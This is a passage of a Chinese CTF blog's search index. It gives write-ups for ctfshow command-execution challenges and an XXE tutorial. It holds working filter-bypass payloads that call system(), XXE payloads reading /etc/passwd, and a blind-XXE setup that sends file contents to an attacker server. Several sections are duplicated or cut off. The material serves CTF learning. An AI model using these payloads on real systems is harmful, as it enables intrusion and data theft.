","date":"2023-11-17","objectID":"/ctfshow_rce/:22:32","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web75"},{"categories":["CTF","web"],"content":"\r[web77]读取目录发现flag36x.txt和readflag 前面的套路失效了，根据提示使用PHP7.4以上才有的FFI进行命令执行 FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。 payload： c=$ffi = FFI::cdef(\"int system(const char *command);\"); $a='/readflag \u003e 1.txt'; $ffi-\u003esystem($a); 随后我们访问1.txt即可得到flag ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:33","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web77"},{"categories":["CTF","web"],"content":"\r[web118] \u003c!DOCTYPE html\u003e \u003chtml lang=\"zh-cn\"\u003e \u003cbody\u003e \u003cdiv style=\"width:400px;height:10px;margin:100px auto\"\u003e \u003cform action='' method=post\u003e \u003cinput type='text' name='code' placeholder=\"给你打开一扇通往结界的窗户，可惜钥匙你是找不到的 \"\u003e \u003c/form\u003e \u003c!-- system($code);--\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e 题目的描述告诉我们flag在flag.php里面 题目环境的前端提示我们输入的命令会被执行，但经过尝试ls等命令是被ban掉的 bash的内置变量进行绕过 $PWD用法： $PWD和${PWD} /var/www/html 结果一样 ${#PWD} 13 $PWD的长度 ${PWD:3} r/www/html ${PWD:~3} html ${PWD:3:1} r ${PWD:~3:1} h ${SHLVL:~A} 1 A是字符串 转换为数字相当于0 拼接出nl： n: ${PATH:~A} n #如果$PATH结尾为n ${PATH:${#TERM}:${SHLVL:~A}} # n 相当于${PATH:14:1} l: ${#RANDOM} # 4或者5 ${PATH:${#RANDOM}:${#SHLVL:~A}} #l https://www.cnblogs.com/sparkdev/p/9934595.html#title_pwd 构造payload： ${PATH:~A}${PWD:~A}$IFS????.??? //也就是 nl flag.php ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:34","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web118"},{"categories":["CTF","web"],"content":"\r[web119]跟上题一样，不过PATH被ban了。 SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}=1，然后在此shell中再打开一个shell时$SHLVL=2。 ${SHLVL} //一般是一个个位数 ${#SHLVL} //1，表示结果的字符长度 ${PWD:${#}:${#SHLVL}} //表示/ ${USER} //www-data ${PHP_VERSION:~A} //2 ${USER:~${PHP_VERSION:~A}:${PHP_VERSION:~A}} //at ${PHP_VERSION:~A}来自于返回报文的头部，为2： payload： ${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?${USER:~${PHP_VERSION:~A}:${PHP_VERSION:~A}} ????.??? //也就是：/???/?at ????.??? ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:35","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web119"},{"categories":["CTF","web"],"content":"\r[web120] \u003c?php error_reporting(0); highlight_file(__FILE__); if(isset($_POST['code'])){ $code=$_POST['code']; if(!preg_match('/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\\u003c|\\\u003e|\\'|\\\"|\\`|\\||\\,/', $code)){ if(strlen($code)\u003e65){ echo '\u003cdiv align=\"center\"\u003e'.'you are so long , I dont like '.'\u003c/div\u003e'; } else{ echo '\u003cdiv align=\"center\"\u003e'.system($code).'\u003c/div\u003e'; } } else{ echo '\u003cdiv align=\"center\"\u003eevil input\u003c/div\u003e'; } } ?\u003e 限制的$code的长度 把${#}省略 payload: code=${PWD::${##}}???${PWD::${##}}??${PWD:~${SHLVL}:${##}} ????.??? 也可以用/bin/base64 flag.php 即payload：($RANDOM 的范围是 [0, 32767]) code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.??? ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:36","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web120"},{"categories":["CTF","web"],"content":"\r[web121] \u003c?php error_reporting(0); highlight_file(__FILE__); if(isset($_POST['code'])){ $code=$_POST['code']; if(!preg_match('/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|\\%|\\\u003c|\\\u003e|\\'|\\\"|\\`|\\||\\,/', $code)){ if(strlen($code)\u003e65){ echo '\u003cdiv align=\"center\"\u003e'.'you are so long , I dont like '.'\u003c/div\u003e'; } else{ echo '\u003cdiv align=\"center\"\u003e'.system($code).'\u003c/div\u003e'; } } else{ echo '\u003cdiv align=\"center\"\u003eevil input\u003c/div\u003e'; } } ?\u003e rev命令将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推。 尝试构造命令：/bin/rev flag.php ${#IFS}在ubuntu等系统中值为3，在kali中测试值为4 ${#}为添加到shell的参数个数，${##}则为值1 payload： code=${PWD::${##}}???${PWD::${##}}${PWD:${#IFS}:${##}}?? ????.??? 得到的flag值放在Linux里面rev一下就可以了 另外 $?表示上次命令的执行返回码，0表示正常，其他都是不正常。 所以我们可以有如下payload： code=${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.??? ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:37","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web121"},{"categories":["CTF","web"],"content":"\r[web122] \u003c?php error_reporting(0); highlight_file(__FILE__); if(isset($_POST['code'])){ $code=$_POST['code']; if(!preg_match('/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|#|%|\\\u003e|\\'|\\\"|\\`|\\||\\,/', $code)){ if(strlen($code)\u003e65){ echo '\u003cdiv align=\"center\"\u003e'.'you are so long , I dont like '.'\u003c/div\u003e'; } else{ echo '\u003cdiv align=\"center\"\u003e'.system($code).'\u003c/div\u003e'; } } else{ echo '\u003cdiv align=\"center\"\u003eevil input\u003c/div\u003e'; } } ?\u003e 比121又过滤了PWD和$ 利用\u003cA的报错就能返回值1。 这一题借用${HOME}的第一位为/：payload： code=\u003cA;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.??? （多执行几次） ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:38","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web122"},{"categories":["CTF","web"],"content":"\r[web124] \u003c?php /* # -*- coding: utf-8 -*- # @Author: 收集自网络 # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-10-06 14:04:45 */ error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET['c'])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) \u003e= 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';'); } 当前目录下的文件： c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=ls 读取文件： c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=tac flag.php 解析$pi是因为题目限制只能用这个，其他的不让用 首先$pi的值是_GET，定义这个变量是因为为了动态调用php函数 动态调用 PHP 函数，需要使用 $var{func} 这种形式，其中 $var 是一个字符串，{func} 表示函数名。否则，如果直接使用 $func，则 PHP 引擎会将其解释为一个未定义的常量，并且会导致语法错误。 为了调用system函数，就要构造 $pi{abs}($pi{acos});\u0026abs=system\u0026acos=ls $pi{abs}($pi{acos});\u0026abs=system\u0026acos=tac flag.php 因为$pi 是一个字符串，而不是一个函数。$pi 的值是通过将 37907361743 和 1598506324 作为参数传递给 base_convert 和 dechex 函数计算得到的字符串。因此，如果直接使用 $pi{abs}($pi{acos})，PHP 引擎将无法识别 $pi 变量中的函数名。 为了解决这个问题，可以使用 PHP 变量变量解析器和函数调用链来动态调用函数。具体来说，$$pi{abs} 将 $pi{abs} 解释为一个变量名，然后使用 $pi{acos} 作为该变量名的值进行函数调用。因此，$$pi{abs}($$pi{acos}) 将会调用 $pi{abs}($pi{acos})。 所以要构造 $$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=ls $$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=tac flag.php ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:39","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web124"},{"categories":["CTF","web"],"content":"\r[web124] \u003c?php /* # -*- coding: utf-8 -*- # @Author: 收集自网络 # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-10-06 14:04:45 */ error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET['c'])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) \u003e= 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';'); } 当前目录下的文件： c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=ls 读取文件： c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=tac flag.php 解析$pi是因为题目限制只能用这个，其他的不让用 首先$pi的值是_GET，定义这个变量是因为为了动态调用php函数 动态调用 PHP 函数，需要使用 $var{func} 这种形式，其中 $var 是一个字符串，{func} 表示函数名。否则，如果直接使用 $func，则 PHP 引擎会将其解释为一个未定义的常量，并且会导致语法错误。 为了调用system函数，就要构造 $pi{abs}($pi{acos});\u0026abs=system\u0026acos=ls $pi{abs}($pi{acos});\u0026abs=system\u0026acos=tac flag.php 因为$pi 是一个字符串，而不是一个函数。$pi 的值是通过将 37907361743 和 1598506324 作为参数传递给 base_convert 和 dechex 函数计算得到的字符串。因此，如果直接使用 $pi{abs}($pi{acos})，PHP 引擎将无法识别 $pi 变量中的函数名。 为了解决这个问题，可以使用 PHP 变量变量解析器和函数调用链来动态调用函数。具体来说，$$pi{abs} 将 $pi{abs} 解释为一个变量名，然后使用 $pi{acos} 作为该变量名的值进行函数调用。因此，$$pi{abs}($$pi{acos}) 将会调用 $pi{abs}($pi{acos})。 所以要构造 $$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=ls $$pi{abs}($$pi{acos});\u0026abs=system\u0026acos=tac flag.php ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:39","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#解析"},{"categories":["CTF","web"],"content":"ctfshow xxe漏洞专题 ","date":"2023-11-17","objectID":"/ctfshow_xxe/:0:0","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#"},{"categories":["CTF","web"],"content":"\r总结","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:0","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#总结"},{"categories":["CTF","web"],"content":"\rxml基础XML是一种用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#xml基础"},{"categories":["CTF","web"],"content":"\rxml文档结构 \u003c!--XML申明--\u003e \u003c?xml version=\"1.0\"?\u003e \u003c!--文档类型定义--\u003e \u003c!DOCTYPE note [ \u003c!--定义此文档是 note 类型的文档--\u003e \u003c!ELEMENT note (to,from,heading,body)\u003e \u003c!--定义note元素有四个元素--\u003e \u003c!ELEMENT to (#PCDATA)\u003e \u003c!--定义to元素为”#PCDATA”类型--\u003e \u003c!ELEMENT from (#PCDATA)\u003e \u003c!--定义from元素为”#PCDATA”类型--\u003e \u003c!ELEMENT head (#PCDATA)\u003e \u003c!--定义head元素为”#PCDATA”类型--\u003e \u003c!ELEMENT body (#PCDATA)\u003e \u003c!--定义body元素为”#PCDATA”类型--\u003e ]]]\u003e \u003c!--文档元素--\u003e \u003cnote\u003e \u003cto\u003eDave\u003c/to\u003e \u003cfrom\u003eTom\u003c/from\u003e \u003chead\u003eReminder\u003c/head\u003e \u003cbody\u003eYou are a good man\u003c/body\u003e \u003c/note\u003e ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:2","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#xml文档结构"},{"categories":["CTF","web"],"content":"\rDTD文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可 被成行地声明于XML文档中（内部引用），也可作为一个外部引用。内部声明DTD: \u003c!DOCTYPE 根元素 [元素声明]\u003e 引用外部DTD: \u003c!DOCTYPE 根元素 SYSTEM \"文件名\"\u003e DTD文档中重要的关键字如下： DOCTYPE（DTD的声明） ENTITY（实体的声明） SYSTEM、PUBLIC（外部资源申请） ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:3","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#dtd"},{"categories":["CTF","web"],"content":"\r实体实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。 实体按类型主要分为以下四种： 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。 完整的实体类别可参考 DTD - Entities 实体类别参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用\u0026实体名称。 参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。 内部实体： \u003c!ENTITY 实体名称 \"实体的值\"\u003e 外部实体: \u003c!ENTITY 实体名称 SYSTEM \"URI\"\u003e 参数实体： \u003c!ENTITY % 实体名称 \"实体的值\"\u003e 或者 \u003c!ENTITY % 实体名称 SYSTEM \"URI\"\u003e 实例演示：除参数实体外实体+内部实体 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY name \"bmjoker\"\u003e]\u003e \u003cfoo\u003e \u003cvalue\u003e\u0026name;\u003c/value\u003e \u003c/foo\u003e 实例演示：参数实体+外部实体 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY % name SYSTEM \"file:///etc/passwd\"\u003e %name; ]\u003e 注意：%name（参数实体）是在DTD中被引用的，而\u0026name（其余实体）是在xml文档中被引用的。 由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。 外部实体外部实体即在DTD中使用 \u003c!ENTITY 实体名称 SYSTEM \"URI\"\u003e 语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？ 主要的有file、http、https、ftp等等，当然不同的程序支持的不一样： 实例演示： \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY content SYSTEM \"file:///etc/passwd\"\u003e]\u003e \u003cfoo\u003e \u003cvalue\u003e\u0026content;\u003c/value\u003e \u003c/foo\u003e ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:4","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#实体"},{"categories":["CTF","web"],"content":"\r实体实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。 实体按类型主要分为以下四种： 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。 完整的实体类别可参考 DTD - Entities 实体类别参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用\u0026实体名称。 参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。 内部实体： \u003c!ENTITY 实体名称 \"实体的值\"\u003e 外部实体: \u003c!ENTITY 实体名称 SYSTEM \"URI\"\u003e 参数实体： \u003c!ENTITY % 实体名称 \"实体的值\"\u003e 或者 \u003c!ENTITY % 实体名称 SYSTEM \"URI\"\u003e 实例演示：除参数实体外实体+内部实体 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY name \"bmjoker\"\u003e]\u003e \u0026name; 实例演示：参数实体+外部实体 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY % name SYSTEM \"file:///etc/passwd\"\u003e %name; ]\u003e 注意：%name（参数实体）是在DTD中被引用的，而\u0026name（其余实体）是在xml文档中被引用的。 由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。 外部实体外部实体即在DTD中使用 \u003c!ENTITY 实体名称 SYSTEM \"URI\"\u003e 语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？ 主要的有file、http、https、ftp等等，当然不同的程序支持的不一样： 实例演示： \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY content SYSTEM \"file:///etc/passwd\"\u003e]\u003e \u0026content; ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:4","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#实体类别"},{"categories":["CTF","web"],"content":"\r实体实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。 实体按类型主要分为以下四种： 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。 完整的实体类别可参考 DTD - Entities 实体类别参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用\u0026实体名称。 参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。 内部实体： \u003c!ENTITY 实体名称 \"实体的值\"\u003e 外部实体: \u003c!ENTITY 实体名称 SYSTEM \"URI\"\u003e 参数实体： \u003c!ENTITY % 实体名称 \"实体的值\"\u003e 或者 \u003c!ENTITY % 实体名称 SYSTEM \"URI\"\u003e 实例演示：除参数实体外实体+内部实体 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY name \"bmjoker\"\u003e]\u003e \u0026name; 实例演示：参数实体+外部实体 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY % name SYSTEM \"file:///etc/passwd\"\u003e %name; ]\u003e 注意：%name（参数实体）是在DTD中被引用的，而\u0026name（其余实体）是在xml文档中被引用的。 由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。 外部实体外部实体即在DTD中使用 \u003c!ENTITY 实体名称 SYSTEM \"URI\"\u003e 语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？ 主要的有file、http、https、ftp等等，当然不同的程序支持的不一样： 实例演示： \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY content SYSTEM \"file:///etc/passwd\"\u003e]\u003e \u0026content; ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:4","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#外部实体"},{"categories":["CTF","web"],"content":"\rxxe漏洞XXE(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时， 没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、 发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 漏洞检测首先检测XML是否会被成功解析： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY name \"my name is nMask\"\u003e]\u003e \u003croot\u003e\u0026name;\u003c/root\u003e 若页面输出my name is nMask则说明xml可以被解析 随后检测服务器是否支持DTD引用外部实体 \u003c?xml version=”1.0” encoding=”UTF-8”?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY % name SYSTEM \"http://localhost/index.html\"\u003e %name; ]\u003e 可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。若支持引用外部实体，则页面很有可能存在xxe漏洞。 漏洞利用\r文件读取 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY name SYSTEM \"file://c:\\test.txt\"\u003e]\u003e \u003croot\u003e\u0026name;\u003c/root\u003e or（2023 moectf payload） \u003c?xml version=\"1.0\" encoding=\"utf-8\" ?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY b SYSTEM \"file:///flag\"\u003e ]\u003e \u003cxml\u003e\u003cname\u003e\u0026b;\u003c/name\u003e\u003c/xml\u003e Blind XXE漏洞针对无回显的xxe漏洞，我们可以通过构造一个外带信道来带出数据 在自己的vps服务器上创建test.php写入以下内容： \u003c?php file_put_contents(\"test.txt\", $_GET['file']) ; ?\u003e 在目标服务器上创建index.php写入以下内容： \u003c?php $xml=\u003c\u003c\u003cEOF \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE ANY[ \u003c!ENTITY % file SYSTEM \"file:///C:/test.txt\"\u003e \u003c!ENTITY % remote SYSTEM \"http://localhost/test.xml\"\u003e %remote; %all; %send; ]\u003e EOF; $data = simplexml_load_string($xml) ; echo \"\u003cpre\u003e\" ; print_r($data) ; ?\u003e 并创建test.xml并写入以下内容： [html] view plain copy \u003c!ENTITY % all \"\u003c!ENTITY % send SYSTEM 'http://localhost/test.php?file=%file;'\u003e\"\u003e 当访问http://localhost/index.php, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。 ","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:5","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#xxe漏洞"},{"categories":["CTF","web"],"content":"\rxxe漏洞XXE(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时， 没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、 发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 漏洞检测首先检测XML是否会被成功解析： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY name \"my name is nMask\"\u003e]\u003e \u0026name; 若页面输出my name is nMask则说明xml可以被解析 随后检测服务器是否支持DTD引用外部实体 \u003c?xml version=”1.0” encoding=”UTF-8”?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY % name SYSTEM \"http://localhost/index.html\"\u003e %name; ]\u003e 可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。若支持引用外部实体，则页面很有可能存在xxe漏洞。 漏洞利用\r文件读取 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY name SYSTEM \"file://c:\\test.txt\"\u003e]\u003e \u0026name; or（2023 moectf payload） \u003c?xml version=\"1.0\" encoding=\"utf-8\" ?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY b SYSTEM \"file:///flag\"\u003e ]\u003e \u0026b; Blind XXE漏洞针对无回显的xxe漏洞，我们可以通过构造一个外带信道来带出数据 在自己的vps服务器上创建test.php写入以下内容： \u003c?php file_put_contents(\"test.txt\", $_GET['file']) ; ?\u003e 在目标服务器上创建index.php写入以下内容： \u003c?php $xml=\u003c\u003c","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:5","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#漏洞检测"},{"categories":["CTF","web"],"content":"\rxxe漏洞XXE(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时， 没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、 发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 漏洞检测首先检测XML是否会被成功解析： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY name \"my name is nMask\"\u003e]\u003e \u0026name; 若页面输出my name is nMask则说明xml可以被解析 随后检测服务器是否支持DTD引用外部实体 \u003c?xml version=”1.0” encoding=”UTF-8”?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY % name SYSTEM \"http://localhost/index.html\"\u003e %name; ]\u003e 可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。若支持引用外部实体，则页面很有可能存在xxe漏洞。 漏洞利用\r文件读取 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY name SYSTEM \"file://c:\\test.txt\"\u003e]\u003e \u0026name; or（2023 moectf payload） \u003c?xml version=\"1.0\" encoding=\"utf-8\" ?\u003e \u003c!DOCTYPE a [ \u003c!ENTITY b SYSTEM \"file:///flag\"\u003e ]\u003e \u0026b; Blind XXE漏洞针对无回显的xxe漏洞，我们可以通过构造一个外带信道来带出数据 在自己的vps服务器上创建test.php写入以下内容： \u003c?php file_put_contents(\"test.txt\", $_GET['file']) ; ?\u003e 在目标服务器上创建index.php写入以下内容： \u003c?php $xml=\u003c\u003c","date":"2023-11-17","objectID":"/ctfshow_xxe/:1:5","series":null,"tags":["CTF","web"],"title":"ctfshow_xxe","uri":"/ctfshow_xxe/#漏洞利用"},{"categories":["CTF","web"],"content":"\rxxe漏洞XXE(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时， 没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、 发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 漏洞检测首先检测XML是否会被成功解析： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY name \"my name is 